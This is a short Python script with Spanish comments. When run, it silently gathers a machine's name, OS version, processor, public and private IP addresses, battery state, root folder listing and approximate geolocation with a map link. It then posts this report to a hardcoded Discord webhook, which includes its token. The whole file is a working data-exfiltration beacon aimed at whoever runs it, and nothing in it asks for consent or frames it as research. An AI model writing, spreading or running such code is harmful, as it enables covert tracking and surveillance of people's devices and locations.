import os
import requests
import socket
import platform
import psutil

# Tu Webhook privado de Discord
WEBHOOK_URL = 'https://discord.com/api/webhooks/1367570346026205204/5RcW61zcwe9Oy8S3BAauNHEahdcCfR2c0Q2fE_c90mLNpZs1w7JTiPP0g04W_65pX7Rt'

def get_private_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        return "No disponible"

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return "No disponible"

def get_battery_status():
    try:
        battery = psutil.sensors_battery()
        if battery:
            return f"{battery.percent}% {'(Cargando)' if battery.power_plugged else '(No cargando)'}"
        else:
            return "No disponible"
    except:
        return "Error"

def get_system_info():
    return {
        'Dispositivo': platform.node(),
        'Sistema': platform.system(),
        'Versión': platform.version(),
        'Procesador': platform.processor()
    }

def list_main_folders():
    try:
        # Detectar sistema y definir raíz adecuada
        root_path = 'C:\\' if platform.system() == 'Windows' else '/'
        folders = [f for f in os.listdir(root_path) if os.path.isdir(os.path.join(root_path, f))]
        return folders[:20]  # Limitar para no saturar el mensaje
    except:
        return ["No disponible"]

def get_location():
    try:
        response = requests.get('http://ip-api.com/json/')
        data = response.json()
        if data['status'] == 'success':
            lat = data['lat']
            lon = data['lon']
            location = f"{data['city']}, {data['regionName']}, {data['country']}"
            maps_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
            return location, maps_link
        else:
            return "No disponible", ""
    except:
        return "Error", ""

def enviar_reporte():
    info = get_system_info()
    carpetas = list_main_folders()
    location, maps_link = get_location()
    
    mensaje = (
        f"**[REPORTE DEL DISPOSITIVO]**\n"
        f"**Nombre:** {info['Dispositivo']}\n"
        f"**Sistema Operativo:** {info['Sistema']} {info['Versión']}\n"
        f"**Procesador:** {info['Procesador']}\n"
        f"**IP Pública:** {get_public_ip()}\n"
        f"**IP Privada:** {get_private_ip()}\n"
        f"**Batería:** {get_battery_status()}\n"
        f"**Carpetas principales:**\n" + "\n".join(f"- {c}" for c in carpetas) + "\n"
        f"**Ubicación aproximada:** {location}\n"
        f"{maps_link}"
    )

    try:
        requests.post(WEBHOOK_URL, json={"content": mensaje})
    except Exception as e:
        print("Error al enviar el reporte:", e)

# Ejecutar el envío del reporte
enviar_reporte()
